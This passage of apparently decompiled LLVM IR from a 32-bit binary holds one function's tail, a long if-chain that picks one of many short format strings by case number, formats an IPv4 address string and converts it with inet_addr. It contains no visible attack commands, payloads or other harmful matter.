  %v3_10006a44 = icmp eq i32 %v2_10003364, 167
  br i1 %v3_10006a44, label %dec_label_pc_10006a4c, label %dec_label_pc_10006a94

dec_label_pc_10006a4c:                            ; preds = %dec_label_pc_10006a40
  %v2_10006a4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a60 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006a60 = zext i8 %v3_10006a60 to i32
  %v4_10006a90 = call i32 @szprintf(i32 %v2_10006a4c, i32 ptrtoint ([14 x i8]* @global_var_10015f70.207 to i32), i32 %v4_10006a60)
  br label %dec_label_pc_10006a94

dec_label_pc_10006a94:                            ; preds = %dec_label_pc_10006a40, %dec_label_pc_10006a4c
  %v3_10006a98 = icmp eq i32 %v2_10003364, 168
  br i1 %v3_10006a98, label %dec_label_pc_10006aa0, label %dec_label_pc_10006ae8

dec_label_pc_10006aa0:                            ; preds = %dec_label_pc_10006a94
  %v2_10006aa0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ab4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006ab4 = zext i8 %v3_10006ab4 to i32
  %v4_10006ae4 = call i32 @szprintf(i32 %v2_10006aa0, i32 ptrtoint ([14 x i8]* @global_var_10015fe0.214 to i32), i32 %v4_10006ab4)
  br label %dec_label_pc_10006ae8

dec_label_pc_10006ae8:                            ; preds = %dec_label_pc_10006a94, %dec_label_pc_10006aa0
  %v3_10006aec = icmp eq i32 %v2_10003364, 169
  br i1 %v3_10006aec, label %dec_label_pc_10006af4, label %dec_label_pc_10006b3c

dec_label_pc_10006af4:                            ; preds = %dec_label_pc_10006ae8
  %v2_10006af4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b08 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006b08 = zext i8 %v3_10006b08 to i32
  %v4_10006b38 = call i32 @szprintf(i32 %v2_10006af4, i32 ptrtoint ([14 x i8]* @global_var_10015ff0.215 to i32), i32 %v4_10006b08)
  br label %dec_label_pc_10006b3c

dec_label_pc_10006b3c:                            ; preds = %dec_label_pc_10006ae8, %dec_label_pc_10006af4
  %v3_10006b40 = icmp eq i32 %v2_10003364, 171
  br i1 %v3_10006b40, label %dec_label_pc_10006b48, label %dec_label_pc_10006b90

dec_label_pc_10006b48:                            ; preds = %dec_label_pc_10006b3c
  %v2_10006b48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b5c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006b5c = zext i8 %v3_10006b5c to i32
  %v4_10006b8c = call i32 @szprintf(i32 %v2_10006b48, i32 ptrtoint ([14 x i8]* @global_var_10016000.216 to i32), i32 %v4_10006b5c)
  br label %dec_label_pc_10006b90

dec_label_pc_10006b90:                            ; preds = %dec_label_pc_10006b3c, %dec_label_pc_10006b48
  %v3_10006b94 = icmp eq i32 %v2_10003364, 172
  br i1 %v3_10006b94, label %dec_label_pc_10006b9c, label %dec_label_pc_10006be4

dec_label_pc_10006b9c:                            ; preds = %dec_label_pc_10006b90
  %v2_10006b9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006bb0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006bb0 = zext i8 %v3_10006bb0 to i32
  %v4_10006be0 = call i32 @szprintf(i32 %v2_10006b9c, i32 ptrtoint ([14 x i8]* @global_var_10016010.217 to i32), i32 %v4_10006bb0)
  br label %dec_label_pc_10006be4

dec_label_pc_10006be4:                            ; preds = %dec_label_pc_10006b90, %dec_label_pc_10006b9c
  %v3_10006be8 = icmp eq i32 %v2_10003364, 173
  br i1 %v3_10006be8, label %dec_label_pc_10006bf0, label %dec_label_pc_10006c38

dec_label_pc_10006bf0:                            ; preds = %dec_label_pc_10006be4
  %v2_10006bf0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c04 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006c04 = zext i8 %v3_10006c04 to i32
  %v4_10006c34 = call i32 @szprintf(i32 %v2_10006bf0, i32 ptrtoint ([14 x i8]* @global_var_10016020.218 to i32), i32 %v4_10006c04)
  br label %dec_label_pc_10006c38

dec_label_pc_10006c38:                            ; preds = %dec_label_pc_10006be4, %dec_label_pc_10006bf0
  %v3_10006c3c = icmp eq i32 %v2_10003364, 174
  br i1 %v3_10006c3c, label %dec_label_pc_10006c44, label %dec_label_pc_10006c8c

dec_label_pc_10006c44:                            ; preds = %dec_label_pc_10006c38
  %v2_10006c44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c58 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006c58 = zext i8 %v3_10006c58 to i32
  %v4_10006c88 = call i32 @szprintf(i32 %v2_10006c44, i32 ptrtoint ([13 x i8]* @global_var_10016030.219 to i32), i32 %v4_10006c58)
  br label %dec_label_pc_10006c8c

dec_label_pc_10006c8c:                            ; preds = %dec_label_pc_10006c38, %dec_label_pc_10006c44
  %v3_10006c90 = icmp eq i32 %v2_10003364, 175
  br i1 %v3_10006c90, label %dec_label_pc_10006c98, label %dec_label_pc_10006ce0

dec_label_pc_10006c98:                            ; preds = %dec_label_pc_10006c8c
  %v2_10006c98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006cac = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006cac = zext i8 %v3_10006cac to i32
  %v4_10006cdc = call i32 @szprintf(i32 %v2_10006c98, i32 ptrtoint ([14 x i8]* @global_var_10016040.220 to i32), i32 %v4_10006cac)
  br label %dec_label_pc_10006ce0

dec_label_pc_10006ce0:                            ; preds = %dec_label_pc_10006c8c, %dec_label_pc_10006c98
  %v3_10006ce4 = icmp eq i32 %v2_10003364, 176
  br i1 %v3_10006ce4, label %dec_label_pc_10006cec, label %dec_label_pc_10006d34

dec_label_pc_10006cec:                            ; preds = %dec_label_pc_10006ce0
  %v2_10006cec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d00 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006d00 = zext i8 %v3_10006d00 to i32
  %v4_10006d30 = call i32 @szprintf(i32 %v2_10006cec, i32 ptrtoint ([14 x i8]* @global_var_10016050.221 to i32), i32 %v4_10006d00)
  br label %dec_label_pc_10006d34

dec_label_pc_10006d34:                            ; preds = %dec_label_pc_10006ce0, %dec_label_pc_10006cec
  %v3_10006d38 = icmp eq i32 %v2_10003364, 177
  br i1 %v3_10006d38, label %dec_label_pc_10006d40, label %dec_label_pc_10006d88

dec_label_pc_10006d40:                            ; preds = %dec_label_pc_10006d34
  %v2_10006d40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d54 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006d54 = zext i8 %v3_10006d54 to i32
  %v4_10006d84 = call i32 @szprintf(i32 %v2_10006d40, i32 ptrtoint ([14 x i8]* @global_var_10016060.222 to i32), i32 %v4_10006d54)
  br label %dec_label_pc_10006d88

dec_label_pc_10006d88:                            ; preds = %dec_label_pc_10006d34, %dec_label_pc_10006d40
  %v3_10006d8c = icmp eq i32 %v2_10003364, 178
  br i1 %v3_10006d8c, label %dec_label_pc_10006d94, label %dec_label_pc_10006ddc

dec_label_pc_10006d94:                            ; preds = %dec_label_pc_10006d88
  %v2_10006d94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006da8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006da8 = zext i8 %v3_10006da8 to i32
  %v4_10006dd8 = call i32 @szprintf(i32 %v2_10006d94, i32 ptrtoint ([13 x i8]* @global_var_10016070.223 to i32), i32 %v4_10006da8)
  br label %dec_label_pc_10006ddc

dec_label_pc_10006ddc:                            ; preds = %dec_label_pc_10006d88, %dec_label_pc_10006d94
  %v3_10006de0 = icmp eq i32 %v2_10003364, 179
  br i1 %v3_10006de0, label %dec_label_pc_10006de8, label %dec_label_pc_10006e30

dec_label_pc_10006de8:                            ; preds = %dec_label_pc_10006ddc
  %v2_10006de8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006dfc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006dfc = zext i8 %v3_10006dfc to i32
  %v4_10006e2c = call i32 @szprintf(i32 %v2_10006de8, i32 ptrtoint ([13 x i8]* @global_var_10016080.224 to i32), i32 %v4_10006dfc)
  br label %dec_label_pc_10006e30

dec_label_pc_10006e30:                            ; preds = %dec_label_pc_10006ddc, %dec_label_pc_10006de8
  %v3_10006e34 = icmp eq i32 %v2_10003364, 180
  br i1 %v3_10006e34, label %dec_label_pc_10006e3c, label %dec_label_pc_10006e84

dec_label_pc_10006e3c:                            ; preds = %dec_label_pc_10006e30
  %v2_10006e3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e50 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006e50 = zext i8 %v3_10006e50 to i32
  %v4_10006e80 = call i32 @szprintf(i32 %v2_10006e3c, i32 ptrtoint ([13 x i8]* @global_var_10016090.225 to i32), i32 %v4_10006e50)
  br label %dec_label_pc_10006e84

dec_label_pc_10006e84:                            ; preds = %dec_label_pc_10006e30, %dec_label_pc_10006e3c
  %v3_10006e88 = icmp eq i32 %v2_10003364, 181
  br i1 %v3_10006e88, label %dec_label_pc_10006e90, label %dec_label_pc_10006ed8

dec_label_pc_10006e90:                            ; preds = %dec_label_pc_10006e84
  %v2_10006e90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ea4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006ea4 = zext i8 %v3_10006ea4 to i32
  %v4_10006ed4 = call i32 @szprintf(i32 %v2_10006e90, i32 ptrtoint ([13 x i8]* @global_var_100160a0.226 to i32), i32 %v4_10006ea4)
  br label %dec_label_pc_10006ed8

dec_label_pc_10006ed8:                            ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e90
  %v3_10006edc = icmp eq i32 %v2_10003364, 182
  br i1 %v3_10006edc, label %dec_label_pc_10006ee4, label %dec_label_pc_10006f2c

dec_label_pc_10006ee4:                            ; preds = %dec_label_pc_10006ed8
  %v2_10006ee4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ef8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006ef8 = zext i8 %v3_10006ef8 to i32
  %v4_10006f28 = call i32 @szprintf(i32 %v2_10006ee4, i32 ptrtoint ([13 x i8]* @global_var_100160b0.227 to i32), i32 %v4_10006ef8)
  br label %dec_label_pc_10006f2c

dec_label_pc_10006f2c:                            ; preds = %dec_label_pc_10006ed8, %dec_label_pc_10006ee4
  %v3_10006f30 = icmp eq i32 %v2_10003364, 183
  br i1 %v3_10006f30, label %dec_label_pc_10006f38, label %dec_label_pc_10006f80

dec_label_pc_10006f38:                            ; preds = %dec_label_pc_10006f2c
  %v2_10006f38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f4c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006f4c = zext i8 %v3_10006f4c to i32
  %v4_10006f7c = call i32 @szprintf(i32 %v2_10006f38, i32 ptrtoint ([13 x i8]* @global_var_100158b0.98 to i32), i32 %v4_10006f4c)
  br label %dec_label_pc_10006f80

dec_label_pc_10006f80:                            ; preds = %dec_label_pc_10006f2c, %dec_label_pc_10006f38
  %v3_10006f84 = icmp eq i32 %v2_10003364, 184
  br i1 %v3_10006f84, label %dec_label_pc_10006f8c, label %dec_label_pc_10006fd4

dec_label_pc_10006f8c:                            ; preds = %dec_label_pc_10006f80
  %v2_10006f8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006fa0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006fa0 = zext i8 %v3_10006fa0 to i32
  %v4_10006fd0 = call i32 @szprintf(i32 %v2_10006f8c, i32 ptrtoint ([13 x i8]* @global_var_100160c0.228 to i32), i32 %v4_10006fa0)
  br label %dec_label_pc_10006fd4

dec_label_pc_10006fd4:                            ; preds = %dec_label_pc_10006f80, %dec_label_pc_10006f8c
  %v3_10006fd8 = icmp eq i32 %v2_10003364, 185
  br i1 %v3_10006fd8, label %dec_label_pc_10006fe0, label %dec_label_pc_10007028

dec_label_pc_10006fe0:                            ; preds = %dec_label_pc_10006fd4
  %v2_10006fe0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ff4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006ff4 = zext i8 %v3_10006ff4 to i32
  %v4_10007024 = call i32 @szprintf(i32 %v2_10006fe0, i32 ptrtoint ([13 x i8]* @global_var_100160d0.229 to i32), i32 %v4_10006ff4)
  br label %dec_label_pc_10007028

dec_label_pc_10007028:                            ; preds = %dec_label_pc_10006fd4, %dec_label_pc_10006fe0
  %v3_1000702c = icmp eq i32 %v2_10003364, 186
  br i1 %v3_1000702c, label %dec_label_pc_10007034, label %dec_label_pc_1000707c

dec_label_pc_10007034:                            ; preds = %dec_label_pc_10007028
  %v2_10007034 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007048 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007048 = zext i8 %v3_10007048 to i32
  %v4_10007078 = call i32 @szprintf(i32 %v2_10007034, i32 ptrtoint ([14 x i8]* @global_var_100160e0.230 to i32), i32 %v4_10007048)
  br label %dec_label_pc_1000707c

dec_label_pc_1000707c:                            ; preds = %dec_label_pc_10007028, %dec_label_pc_10007034
  %v3_10007080 = icmp eq i32 %v2_10003364, 187
  br i1 %v3_10007080, label %dec_label_pc_10007088, label %dec_label_pc_100070d0

dec_label_pc_10007088:                            ; preds = %dec_label_pc_1000707c
  %v2_10007088 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000709c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000709c = zext i8 %v3_1000709c to i32
  %v4_100070cc = call i32 @szprintf(i32 %v2_10007088, i32 ptrtoint ([14 x i8]* @global_var_100160f0.231 to i32), i32 %v4_1000709c)
  br label %dec_label_pc_100070d0

dec_label_pc_100070d0:                            ; preds = %dec_label_pc_1000707c, %dec_label_pc_10007088
  %v3_100070d4 = icmp eq i32 %v2_10003364, 188
  br i1 %v3_100070d4, label %dec_label_pc_100070dc, label %dec_label_pc_10007124

dec_label_pc_100070dc:                            ; preds = %dec_label_pc_100070d0
  %v2_100070dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100070f0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100070f0 = zext i8 %v3_100070f0 to i32
  %v4_10007120 = call i32 @szprintf(i32 %v2_100070dc, i32 ptrtoint ([14 x i8]* @global_var_10016100.232 to i32), i32 %v4_100070f0)
  br label %dec_label_pc_10007124

dec_label_pc_10007124:                            ; preds = %dec_label_pc_100070d0, %dec_label_pc_100070dc
  %v3_10007128 = icmp eq i32 %v2_10003364, 189
  br i1 %v3_10007128, label %dec_label_pc_10007130, label %dec_label_pc_10007178

dec_label_pc_10007130:                            ; preds = %dec_label_pc_10007124
  %v2_10007130 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007144 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007144 = zext i8 %v3_10007144 to i32
  %v4_10007174 = call i32 @szprintf(i32 %v2_10007130, i32 ptrtoint ([14 x i8]* @global_var_10016110.233 to i32), i32 %v4_10007144)
  br label %dec_label_pc_10007178

dec_label_pc_10007178:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_10007130
  %v3_1000717c = icmp eq i32 %v2_10003364, 190
  br i1 %v3_1000717c, label %dec_label_pc_10007184, label %dec_label_pc_100071cc

dec_label_pc_10007184:                            ; preds = %dec_label_pc_10007178
  %v2_10007184 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007198 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007198 = zext i8 %v3_10007198 to i32
  %v4_100071c8 = call i32 @szprintf(i32 %v2_10007184, i32 ptrtoint ([14 x i8]* @global_var_10016120.234 to i32), i32 %v4_10007198)
  br label %dec_label_pc_100071cc

dec_label_pc_100071cc:                            ; preds = %dec_label_pc_10007178, %dec_label_pc_10007184
  %v3_100071d0 = icmp eq i32 %v2_10003364, 191
  br i1 %v3_100071d0, label %dec_label_pc_100071d8, label %dec_label_pc_10007220

dec_label_pc_100071d8:                            ; preds = %dec_label_pc_100071cc
  %v2_100071d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100071ec = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100071ec = zext i8 %v3_100071ec to i32
  %v4_1000721c = call i32 @szprintf(i32 %v2_100071d8, i32 ptrtoint ([14 x i8]* @global_var_10016130.235 to i32), i32 %v4_100071ec)
  br label %dec_label_pc_10007220

dec_label_pc_10007220:                            ; preds = %dec_label_pc_100071cc, %dec_label_pc_100071d8
  %v3_10007224 = icmp eq i32 %v2_10003364, 192
  br i1 %v3_10007224, label %dec_label_pc_1000722c, label %dec_label_pc_10007274

dec_label_pc_1000722c:                            ; preds = %dec_label_pc_10007220
  %v2_1000722c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007240 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007240 = zext i8 %v3_10007240 to i32
  %v4_10007270 = call i32 @szprintf(i32 %v2_1000722c, i32 ptrtoint ([13 x i8]* @global_var_10016140.236 to i32), i32 %v4_10007240)
  br label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %dec_label_pc_10007220, %dec_label_pc_1000722c
  %v3_10007278 = icmp eq i32 %v2_10003364, 193
  br i1 %v3_10007278, label %dec_label_pc_10007280, label %dec_label_pc_100072c8

dec_label_pc_10007280:                            ; preds = %dec_label_pc_10007274
  %v2_10007280 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007294 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007294 = zext i8 %v3_10007294 to i32
  %v4_100072c4 = call i32 @szprintf(i32 %v2_10007280, i32 ptrtoint ([13 x i8]* @global_var_10016150.237 to i32), i32 %v4_10007294)
  br label %dec_label_pc_100072c8

dec_label_pc_100072c8:                            ; preds = %dec_label_pc_10007274, %dec_label_pc_10007280
  %v3_100072cc = icmp eq i32 %v2_10003364, 194
  br i1 %v3_100072cc, label %dec_label_pc_100072d4, label %dec_label_pc_1000731c

dec_label_pc_100072d4:                            ; preds = %dec_label_pc_100072c8
  %v2_100072d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100072e8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100072e8 = zext i8 %v3_100072e8 to i32
  %v4_10007318 = call i32 @szprintf(i32 %v2_100072d4, i32 ptrtoint ([14 x i8]* @global_var_10016160.238 to i32), i32 %v4_100072e8)
  br label %dec_label_pc_1000731c

dec_label_pc_1000731c:                            ; preds = %dec_label_pc_100072c8, %dec_label_pc_100072d4
  %v3_10007320 = icmp eq i32 %v2_10003364, 195
  br i1 %v3_10007320, label %dec_label_pc_10007328, label %dec_label_pc_10007370

dec_label_pc_10007328:                            ; preds = %dec_label_pc_1000731c
  %v2_10007328 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000733c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000733c = zext i8 %v3_1000733c to i32
  %v4_1000736c = call i32 @szprintf(i32 %v2_10007328, i32 ptrtoint ([14 x i8]* @global_var_10016170.239 to i32), i32 %v4_1000733c)
  br label %dec_label_pc_10007370

dec_label_pc_10007370:                            ; preds = %dec_label_pc_1000731c, %dec_label_pc_10007328
  %v3_10007374 = icmp eq i32 %v2_10003364, 196
  br i1 %v3_10007374, label %dec_label_pc_1000737c, label %dec_label_pc_100073c4

dec_label_pc_1000737c:                            ; preds = %dec_label_pc_10007370
  %v2_1000737c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007390 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007390 = zext i8 %v3_10007390 to i32
  %v4_100073c0 = call i32 @szprintf(i32 %v2_1000737c, i32 ptrtoint ([14 x i8]* @global_var_10016180.240 to i32), i32 %v4_10007390)
  br label %dec_label_pc_100073c4

dec_label_pc_100073c4:                            ; preds = %dec_label_pc_10007370, %dec_label_pc_1000737c
  %v3_100073c8 = icmp eq i32 %v2_10003364, 197
  br i1 %v3_100073c8, label %dec_label_pc_100073d0, label %dec_label_pc_10007418

dec_label_pc_100073d0:                            ; preds = %dec_label_pc_100073c4
  %v2_100073d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100073e4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100073e4 = zext i8 %v3_100073e4 to i32
  %v4_10007414 = call i32 @szprintf(i32 %v2_100073d0, i32 ptrtoint ([14 x i8]* @global_var_10016190.241 to i32), i32 %v4_100073e4)
  br label %dec_label_pc_10007418

dec_label_pc_10007418:                            ; preds = %dec_label_pc_100073c4, %dec_label_pc_100073d0
  %v3_1000741c = icmp eq i32 %v2_10003364, 198
  br i1 %v3_1000741c, label %dec_label_pc_10007424, label %dec_label_pc_1000746c

dec_label_pc_10007424:                            ; preds = %dec_label_pc_10007418
  %v2_10007424 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007438 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007438 = zext i8 %v3_10007438 to i32
  %v4_10007468 = call i32 @szprintf(i32 %v2_10007424, i32 ptrtoint ([14 x i8]* @global_var_100161a0.242 to i32), i32 %v4_10007438)
  br label %dec_label_pc_1000746c

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_10007418, %dec_label_pc_10007424
  %v3_10007470 = icmp eq i32 %v2_10003364, 199
  br i1 %v3_10007470, label %dec_label_pc_10007478, label %dec_label_pc_100074c0

dec_label_pc_10007478:                            ; preds = %dec_label_pc_1000746c
  %v2_10007478 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000748c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000748c = zext i8 %v3_1000748c to i32
  %v4_100074bc = call i32 @szprintf(i32 %v2_10007478, i32 ptrtoint ([14 x i8]* @global_var_100161b0.243 to i32), i32 %v4_1000748c)
  br label %dec_label_pc_100074c0

dec_label_pc_100074c0:                            ; preds = %dec_label_pc_1000746c, %dec_label_pc_10007478
  %v3_100074c4 = icmp eq i32 %v2_10003364, 200
  br i1 %v3_100074c4, label %dec_label_pc_100074cc, label %dec_label_pc_10007514

dec_label_pc_100074cc:                            ; preds = %dec_label_pc_100074c0
  %v2_100074cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100074e0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100074e0 = zext i8 %v3_100074e0 to i32
  %v4_10007510 = call i32 @szprintf(i32 %v2_100074cc, i32 ptrtoint ([14 x i8]* @global_var_100161c0.244 to i32), i32 %v4_100074e0)
  br label %dec_label_pc_10007514

dec_label_pc_10007514:                            ; preds = %dec_label_pc_100074c0, %dec_label_pc_100074cc
  %v3_10007518 = icmp eq i32 %v2_10003364, 201
  br i1 %v3_10007518, label %dec_label_pc_10007574, label %dec_label_pc_10007568

dec_label_pc_10007568:                            ; preds = %dec_label_pc_10007514
  br label %dec_label_pc_100075bc

dec_label_pc_10007574:                            ; preds = %dec_label_pc_10007514
  %v2_10007520 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007534 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007534 = zext i8 %v3_10007534 to i32
  %v4_10007564 = call i32 @szprintf(i32 %v2_10007520, i32 ptrtoint ([14 x i8]* @global_var_100161d0.245 to i32), i32 %v4_10007534)
  %v3_10007588 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007588 = zext i8 %v3_10007588 to i32
  %v4_100075b8 = call i32 @szprintf(i32 %v2_10007520, i32 ptrtoint ([13 x i8]* @global_var_100161e0.246 to i32), i32 %v4_10007588)
  br label %dec_label_pc_100075bc

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_10007568, %dec_label_pc_10007574
  %v3_100075c0 = icmp eq i32 %v2_10003364, 202
  br i1 %v3_100075c0, label %dec_label_pc_100075c8, label %dec_label_pc_10007610

dec_label_pc_100075c8:                            ; preds = %dec_label_pc_100075bc
  %v2_100075c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100075dc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100075dc = zext i8 %v3_100075dc to i32
  %v4_1000760c = call i32 @szprintf(i32 %v2_100075c8, i32 ptrtoint ([13 x i8]* @global_var_100161f0.247 to i32), i32 %v4_100075dc)
  br label %dec_label_pc_10007610

dec_label_pc_10007610:                            ; preds = %dec_label_pc_100075bc, %dec_label_pc_100075c8
  %v3_10007614 = icmp eq i32 %v2_10003364, 203
  br i1 %v3_10007614, label %dec_label_pc_1000761c, label %dec_label_pc_10007664

dec_label_pc_1000761c:                            ; preds = %dec_label_pc_10007610
  %v2_1000761c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007630 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007630 = zext i8 %v3_10007630 to i32
  %v4_10007660 = call i32 @szprintf(i32 %v2_1000761c, i32 ptrtoint ([13 x i8]* @global_var_10016200.248 to i32), i32 %v4_10007630)
  br label %dec_label_pc_10007664

dec_label_pc_10007664:                            ; preds = %dec_label_pc_10007610, %dec_label_pc_1000761c
  %v3_10007668 = icmp eq i32 %v2_10003364, 204
  br i1 %v3_10007668, label %dec_label_pc_10007670, label %dec_label_pc_100076b8

dec_label_pc_10007670:                            ; preds = %dec_label_pc_10007664
  %v2_10007670 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007684 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007684 = zext i8 %v3_10007684 to i32
  %v4_100076b4 = call i32 @szprintf(i32 %v2_10007670, i32 ptrtoint ([13 x i8]* @global_var_10016210.249 to i32), i32 %v4_10007684)
  br label %dec_label_pc_100076b8

dec_label_pc_100076b8:                            ; preds = %dec_label_pc_10007664, %dec_label_pc_10007670
  %v3_100076bc = icmp eq i32 %v2_10003364, 205
  br i1 %v3_100076bc, label %dec_label_pc_100076c4, label %dec_label_pc_1000770c

dec_label_pc_100076c4:                            ; preds = %dec_label_pc_100076b8
  %v2_100076c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100076d8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100076d8 = zext i8 %v3_100076d8 to i32
  %v4_10007708 = call i32 @szprintf(i32 %v2_100076c4, i32 ptrtoint ([13 x i8]* @global_var_10016220.250 to i32), i32 %v4_100076d8)
  br label %dec_label_pc_1000770c

dec_label_pc_1000770c:                            ; preds = %dec_label_pc_100076b8, %dec_label_pc_100076c4
  %v3_10007710 = icmp eq i32 %v2_10003364, 206
  br i1 %v3_10007710, label %dec_label_pc_10007718, label %dec_label_pc_10007760

dec_label_pc_10007718:                            ; preds = %dec_label_pc_1000770c
  %v2_10007718 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000772c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000772c = zext i8 %v3_1000772c to i32
  %v4_1000775c = call i32 @szprintf(i32 %v2_10007718, i32 ptrtoint ([13 x i8]* @global_var_10016230.251 to i32), i32 %v4_1000772c)
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_1000770c, %dec_label_pc_10007718
  %v3_10007764 = icmp eq i32 %v2_10003364, 207
  %v2_1000776c = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_10007764, label %dec_label_pc_1000776c, label %dec_label_pc_100077b4

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007760
  %v3_10007780 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10007780 = zext i8 %v3_10007780 to i32
  %v4_100077b0 = call i32 @szprintf(i32 %v2_1000776c, i32 ptrtoint ([14 x i8]* @global_var_10016240.252 to i32), i32 %v4_10007780)
  br label %dec_label_pc_100077b4

dec_label_pc_100077b4:                            ; preds = %dec_label_pc_10007760, %dec_label_pc_1000776c
  br i1 false, label %dec_label_pc_100077c0, label %dec_label_pc_10007808

dec_label_pc_100077c0:                            ; preds = %dec_label_pc_100077b4
  br label %dec_label_pc_10007808

dec_label_pc_10007808:                            ; preds = %dec_label_pc_100077b4, %dec_label_pc_100077c0
  store i32 268466196, i32* @lr, align 4
  %v1_10007810 = call i32 @inet_addr(i32 %v2_1000776c)
  ret i32 %v1_10007810

; uselistorder directives
  uselistorder i8* @global_var_100287ec.55, { 1, 0 }
  uselistorder i8* @global_var_100287eb.54, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007808, { 1, 0 }
  uselistorder label %dec_label_pc_100077b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007760, { 1, 0 }
